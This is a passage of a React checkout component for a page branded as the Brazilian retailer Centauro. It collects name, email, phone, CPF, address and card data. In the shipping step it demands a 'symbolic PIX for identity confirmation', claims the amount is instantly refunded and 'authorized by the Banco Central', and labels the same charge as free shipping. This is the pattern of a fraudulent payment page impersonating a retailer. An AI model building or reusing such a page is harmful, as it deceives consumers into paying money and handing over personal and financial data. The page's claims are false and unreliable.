                  className={`py-5 ${showFieldErrors && !nome ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                />
                {showFieldErrors && !nome && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
              </div>

              {/* Email + Telefone */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div data-field-error={showFieldErrors && (!email || !!emailError) ? 'true' : undefined} className="relative">
                  <label className="text-xs font-bold text-foreground mb-1.5 block">E-mail</label>
                  <Input
                    type="email"
                    placeholder="seu@email.com"
                    value={email}
                    onChange={handleEmailChange}
                    onFocus={() => setShowEmailSuggestions(true)}
                    onBlur={() => setTimeout(() => setShowEmailSuggestions(false), 200)}
                    autoComplete="off"
                    className={`py-5 ${emailError || (showFieldErrors && !email) ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                  />
                  {showEmailSuggestions && getEmailSuggestions().length > 0 && (
                    <div className="absolute z-50 w-full mt-1 bg-card border border-border rounded-md shadow-lg max-h-48 overflow-y-auto">
                      {getEmailSuggestions().map((suggestion) => (
                        <button
                          key={suggestion}
                          type="button"
                          onMouseDown={() => handleSelectEmailSuggestion(suggestion)}
                          className="w-full text-left px-3 py-2 text-sm text-foreground hover:bg-accent transition-colors"
                        >
                          {suggestion}
                        </button>
                      ))}
                    </div>
                  )}
                  {emailError && <p className="text-destructive text-xs font-semibold mt-1.5">{emailError}</p>}
                  {showFieldErrors && !email && !emailError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
                </div>
                <div data-field-error={showFieldErrors && (telefone.replace(/\D/g, '').length < 10 || !!telefoneError) ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Telefone</label>
                  <Input
                    placeholder="(00) 00000-0000"
                    value={telefone}
                    onChange={handleTelefoneChange}
                    className={`py-5 ${telefoneError || (showFieldErrors && telefone.replace(/\D/g, '').length < 10) ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                    inputMode="numeric"
                    maxLength={15}
                  />
                  {telefoneError && <p className="text-destructive text-xs font-semibold mt-1.5">{telefoneError}</p>}
                  {showFieldErrors && !telefone && !telefoneError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
                </div>
              </div>

              {/* CPF */}
              <div data-field-error={showFieldErrors && (cpf.replace(/\D/g, '').length !== 11 || !!cpfError) ? 'true' : undefined}>
                <label className="text-xs font-bold text-foreground mb-1.5 block">CPF</label>
                <Input
                  placeholder="000.000.000-00"
                  value={cpf}
                  onChange={handleCpfChange}
                  className={`py-5 ${cpfError || (showFieldErrors && cpf.replace(/\D/g, '').length !== 11) ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                  inputMode="numeric"
                  maxLength={14}
                />
                {cpfError && <p className="text-destructive text-xs font-semibold mt-1.5">{cpfError}</p>}
                {showFieldErrors && !cpf && !cpfError && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
              </div>
            </div>

            <Button
              onClick={handleNextStep}
              className="w-full bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-7 rounded-lg mt-6 transition-transform hover:scale-[1.02] active:scale-95"
            >
              CONTINUAR <ChevronRight size={18} className="ml-1" />
            </Button>
          </Card>
        )}

        {/* STEP 2: Frete */}
        {currentStep === 2 && (
          <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
            <div className="flex items-center gap-2 mb-5">
              <MapPin size={16} className="text-centauro-green" />
              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Endereço de Entrega</h3>
            </div>

            <div className="space-y-4">
              {/* CEP */}
              <div data-field-error={showFieldErrors && cep.replace(/\D/g, '').length !== 8 ? 'true' : undefined}>
                <label className="text-xs font-bold text-foreground mb-1.5 block">CEP</label>
                <div className="relative">
                  <Input
                    placeholder="00000-000"
                    value={cep}
                    onChange={handleCepChange}
                    inputMode="numeric"
                    pattern="[0-9]*"
                    className={`py-5 ${showFieldErrors && cep.replace(/\D/g, '').length !== 8 ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                    maxLength={9}
                  />
                  {cepLoading && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <div className="w-4 h-4 border-2 border-primary border-t-transparent rounded-full animate-spin" />
                    </div>
                  )}
                </div>
                {showFieldErrors && cep.replace(/\D/g, '').length !== 8 && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
              </div>

              {/* Endereço + Número */}
              <div className="grid grid-cols-3 gap-4">
                <div className="col-span-2" data-field-error={showFieldErrors && !endereco ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Endereço</label>
                  <Input
                    placeholder="Rua, Avenida..."
                    value={endereco}
                    onChange={(e) => setEndereco(e.target.value)}
                    className={`py-5 ${showFieldErrors && !endereco ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                  />
                  {showFieldErrors && !endereco && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
                </div>
                <div data-field-error={showFieldErrors && !numero ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Número</label>
                  <Input
                    placeholder="Nº"
                    value={numero}
                    onChange={(e) => setNumero(e.target.value.replace(/\D/g, ''))}
                    inputMode="numeric"
                    pattern="[0-9]*"
                    className={`py-5 ${showFieldErrors && !numero ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                  />
                  {showFieldErrors && !numero && <p className="text-destructive text-xs font-semibold mt-1.5">Campo obrigatório</p>}
                </div>
              </div>

              {/* Complemento */}
              <div>
                <label className="text-xs font-bold text-foreground mb-1.5 block">Complemento <span className="text-muted-foreground font-normal">(opcional)</span></label>
                <Input
                  placeholder="Apto, Bloco..."
                  value={complemento}
                  onChange={(e) => setComplemento(e.target.value)}
                  className="py-5"
                />
              </div>

              {/* Bairro + Cidade + Estado */}
              <div className="grid grid-cols-[1fr_1fr_80px] gap-4">
                <div data-field-error={showFieldErrors && !bairro ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Bairro</label>
                  <Input placeholder="Bairro" value={bairro} onChange={(e) => setBairro(e.target.value)} className={`py-5 ${showFieldErrors && !bairro ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
                  {showFieldErrors && !bairro && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
                </div>
                <div data-field-error={showFieldErrors && !cidade ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Cidade</label>
                  <Input placeholder="Cidade" value={cidade} onChange={(e) => setCidade(e.target.value)} className={`py-5 ${showFieldErrors && !cidade ? 'border-destructive focus-visible:ring-destructive' : ''}`} />
                  {showFieldErrors && !cidade && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
                </div>
                <div data-field-error={showFieldErrors && !estado ? 'true' : undefined}>
                  <label className="text-xs font-bold text-foreground mb-1.5 block">Estado</label>
                  <select value={estado} onChange={(e) => setEstado(e.target.value)} className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 ${showFieldErrors && !estado ? 'border-destructive focus:ring-destructive' : ''}`}>
                    <option value="">UF</option>
                    {["AC","AL","AP","AM","BA","CE","DF","ES","GO","MA","MT","MS","MG","PA","PB","PR","PE","PI","RJ","RN","RS","RO","RR","SC","SP","SE","TO"].map(uf => (
                      <option key={uf} value={uf}>{uf}</option>
                    ))}
                  </select>
                  {showFieldErrors && !estado && <p className="text-destructive text-xs font-semibold mt-1.5">Obrigatório</p>}
                </div>
              </div>

              {/* Confirmação de Identidade via PIX (estornável) */}
              {cepValid && (
                <div className="mt-2">
                  <div className="rounded-xl border-2 border-centauro-green bg-centauro-green/5 p-4 space-y-3">
                    <div className="flex items-center gap-2">
                      <Shield size={18} className="text-centauro-green" />
                      <p className="text-sm font-black text-foreground uppercase tracking-tight">
                        Confirmação de Identidade
                      </p>
                      <span className="ml-auto text-[10px] font-black bg-centauro-green text-primary-foreground px-2 py-0.5 rounded-full uppercase">
                        100% estornável
                      </span>
                    </div>

                    <p className="text-xs text-foreground leading-relaxed">
                      Para garantir a segurança da entrega e evitar fraudes, é necessário fazer um <strong>PIX simbólico de confirmação de identidade</strong>. O valor é <strong>estornado instantaneamente</strong> assim que sua identidade for validada (valores entre R$ 9,40 e R$ 50,00 — o seu é de <strong>R$ {shippingCost.toFixed(2).replace('.', ',')}</strong>).
                    </p>

                    <div className="grid grid-cols-3 gap-2 pt-1">
                      <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                        <Lock size={14} className="text-centauro-green" />
                        <span className="text-[10px] font-bold text-foreground leading-tight">Pagamento<br/>seguro</span>
                      </div>
                      <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                        <Clock size={14} className="text-centauro-green" />
                        <span className="text-[10px] font-bold text-foreground leading-tight">Estorno<br/>instantâneo</span>
                      </div>
                      <div className="flex flex-col items-center text-center gap-1 p-2 rounded-lg bg-background/60">
                        <Truck size={14} className="text-centauro-green" />
                        <span className="text-[10px] font-bold text-foreground leading-tight">Frete<br/>grátis</span>
                      </div>
                    </div>

                    <div className="flex items-center justify-between pt-2 border-t border-centauro-green/30">
                      <span className="text-xs font-bold text-muted-foreground">Valor a confirmar:</span>
                      <span className="text-lg font-black text-centauro-green">R$ {shippingCost.toFixed(2).replace('.', ',')}</span>
                    </div>

                    <p className="text-[10px] text-muted-foreground text-center">
                      ✓ Cobrança autorizada pelo Banco Central — você recebe o estorno na mesma chave PIX.
                    </p>
                  </div>
                </div>
              )}
            </div>

            <div className="flex gap-3 mt-6">
              <Button
                variant="outline"
                onClick={() => setCurrentStep(1)}
                className="flex-1 py-7 font-bold text-sm"
              >
                Voltar
              </Button>
              <Button
                onClick={handleNextStep}
                className="flex-[2] bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-7 rounded-lg transition-transform hover:scale-[1.02] active:scale-95"
              >
                CONTINUAR <ChevronRight size={18} className="ml-1" />
              </Button>
            </div>
          </Card>
        )}

        {/* STEP 3: Pagamento */}
        {currentStep === 3 && (
          <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
            <div className="flex items-center gap-2 mb-5">
              <CreditCard size={16} className="text-centauro-green" />
              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Forma de Pagamento</h3>
            </div>

            {/* Summary of previous steps */}
            <div className="space-y-4 mb-6">
              <div className="bg-muted/50 rounded-lg p-4 space-y-2">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-black text-foreground uppercase">Dados Pessoais</h4>
                  <button onClick={() => setCurrentStep(1)} className="text-[10px] font-bold text-centauro-green hover:underline">Editar</button>
                </div>
                <p className="text-xs text-muted-foreground">{nome}</p>
                <p className="text-xs text-muted-foreground">{email} • {telefone}</p>
                <p className="text-xs text-muted-foreground">CPF: {cpf}</p>
              </div>

              <div className="bg-muted/50 rounded-lg p-4 space-y-2">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-black text-foreground uppercase">Entrega</h4>
                  <button onClick={() => setCurrentStep(2)} className="text-[10px] font-bold text-centauro-green hover:underline">Editar</button>
                </div>
                <p className="text-xs text-muted-foreground">{endereco}, {numero}{complemento ? `, ${complemento}` : ''}</p>
                <p className="text-xs text-muted-foreground">{bairro} — {cidade}/{estado} — CEP {cep}</p>
                <p className="text-xs font-bold text-centauro-green">✓ Frete grátis para todo o Brasil</p>
              </div>

              <div className="bg-centauro-green/5 border border-centauro-green/30 rounded-lg p-4 space-y-1">
                <div className="flex items-center gap-2">
                  <Shield size={14} className="text-centauro-green" />
                  <h4 className="text-xs font-black text-foreground uppercase">Confirmação de Identidade</h4>
                </div>
                <p className="text-[11px] text-muted-foreground">PIX simbólico de R$ {shippingCost.toFixed(2).replace('.', ',')} — <strong className="text-foreground">estornado instantaneamente</strong> após validação.</p>
              </div>
            </div>

            {/* Tabs PIX / Cartão (só quando cartão habilitado E Pagou.ai configurada) */}
            {creditCardEnabled && pagouaiPublicKey ? (
              <div className="grid grid-cols-2 gap-2 mb-4">
                <button
                  type="button"
                  onClick={() => setPaymentMethod('pix')}
                  className={`p-3 rounded-lg border-2 text-xs font-black transition-all ${paymentMethod === 'pix' ? 'border-centauro-green bg-centauro-green/5 text-centauro-green' : 'border-border text-muted-foreground'}`}
                >
                  PIX
                  <p className="text-[10px] font-normal mt-0.5">Aprovação instantânea</p>
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('card')}
                  className={`p-3 rounded-lg border-2 text-xs font-black transition-all ${paymentMethod === 'card' ? 'border-centauro-green bg-centauro-green/5 text-centauro-green' : 'border-border text-muted-foreground'}`}
                >
                  Cartão de Crédito
                  <p className="text-[10px] font-normal mt-0.5">À vista (1x)</p>
                </button>
              </div>
            ) : (
              <div className="border-2 border-centauro-green rounded-lg p-4 bg-centauro-green/5 mb-4">
                <div className="flex items-center gap-3">
                  <div className="w-5 h-5 rounded-full border-2 border-centauro-green flex items-center justify-center">
                    <div className="w-2.5 h-2.5 rounded-full bg-centauro-green" />
                  </div>
                  <div className="flex-1">
                    <p className="text-sm font-black text-foreground">PIX</p>
                    <p className="text-[10px] text-muted-foreground">Aprovação instantânea</p>
                  </div>
                  <span className="text-lg font-black text-centauro-green">R$ {(shippingCost || 29.90).toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}

            {(pixError || cardError) && (
              <div className="mb-3 p-3 rounded-lg bg-destructive/10 text-destructive text-xs font-bold text-center border border-destructive/30">
                {pixError || cardError}
              </div>
            )}

            {paymentMethod === 'card' && creditCardEnabled && pagouaiPublicKey ? (
              <PagouAiCardForm
                onSubmitResult={handleCardSuccess}
                publicKey={pagouaiPublicKey}
                amount={shippingCost || 29.90}
                disabled={!isFormValid || cardLoading}
                onCreateTransaction={async (tokenData) => {
                  if (!isFormValid) {
                    setShowFieldErrors(true);
                    setCardError('Preencha todos os dados obrigatórios.');
                    throw new Error('Preencha todos os dados obrigatórios.');
                  }
                  return await handleCardPayment(tokenData);
                }}
              />
            ) : (
              <Button
                onClick={() => {
                  if (!isFormValid) {
                    setShowFieldErrors(true);
                    return;
                  }
                  handleSubmit();
                }}
                disabled={pixLoading}
                className="w-full bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-7 rounded-lg transition-transform hover:scale-[1.02] active:scale-95"
                style={{ boxShadow: '0 6px 25px hsl(145 63% 42% / 0.5)', animation: 'pulse-glow-green 2s ease-in-out infinite' }}
              >
                {pixLoading ? (
                  <><Loader2 size={18} className="mr-2 animate-spin" /> GERANDO PIX...</>
                ) : (
                  'VERIFICAR AGORA'
                )}
              </Button>
            )}
          </Card>
        )}

        {/* Trust */}
        <div className="grid grid-cols-3 gap-3 mb-6">
          {[
            { icon: CheckCircle, color: 'text-foreground', title: 'Resgate Imediato' },
            { icon: Truck, color: 'text-foreground', title: '3-5 dias úteis' },
            { icon: Shield, color: 'text-foreground', title: 'Compra Segura' },
          ].map(({ icon: Icon, color, title }) => (
            <div key={title} className="bg-card p-3 rounded-lg border border-border text-center">
              <Icon className={`${color} mx-auto mb-1`} size={18} />
              <p className="text-[10px] font-bold text-foreground">{title}</p>
            </div>
          ))}
        </div>

        {/* Footer */}
        <div className="text-center py-4">
          <img src={centauroLogo} alt="Centauro" className="h-10 mx-auto mb-2 opacity-30" />
          <p className="text-muted-foreground text-[10px]">© 2026 Centauro Esportes. Todos os direitos reservados.</p>
        </div>
      </div>

      {/* Store Unavailable Error Popup */}
      <AlertDialog open={showStoreError} onOpenChange={setShowStoreError}>
        <AlertDialogContent className="max-w-[calc(100%-2rem)] mx-auto rounded-xl">
          <AlertDialogHeader>
            <AlertDialogTitle>Unidade Indisponível</AlertDialogTitle>
            <AlertDialogDescription>
              A unidade <strong>{nearestStore ? nearestStore.name : 'Centauro mais próxima'}</strong> está indisponível para retirada presencial no momento. Por favor, selecione o envio via Correios SEDEX.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction
              onClick={() => {
                setShippingMethod('sedex');
                setShowStoreError(false);
              }}
              className="bg-centauro-green hover:bg-centauro-green/80"
            >
              Enviar por SEDEX — R$ {shippingCost.toFixed(2).replace('.', ',')}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* CEP Error Popup */}
      <AlertDialog open={showCepError} onOpenChange={setShowCepError}>
        <AlertDialogContent className="max-w-[calc(100%-2rem)] mx-auto rounded-xl">
          <AlertDialogHeader>
            <AlertDialogTitle>CEP Inválido</AlertDialogTitle>
            <AlertDialogDescription>
              O CEP informado não foi encontrado. Por favor, verifique o número digitado e tente novamente.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction
              onClick={() => {
                setShowCepError(false);
                setCep('');
              }}
              className="bg-primary hover:bg-primary/80"
            >
              Tentar Novamente
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* PIX Popup */}
      <PixPopup
        open={showPixPopup}
        onOpenChange={setShowPixPopup}
        pixCode={pixCode}
        pixQrCodeBase64={pixQrCodeBase64}
        orderId={pixOrderId}
        amount={shippingCost || 29.90}
      />
    </div>
  );
}
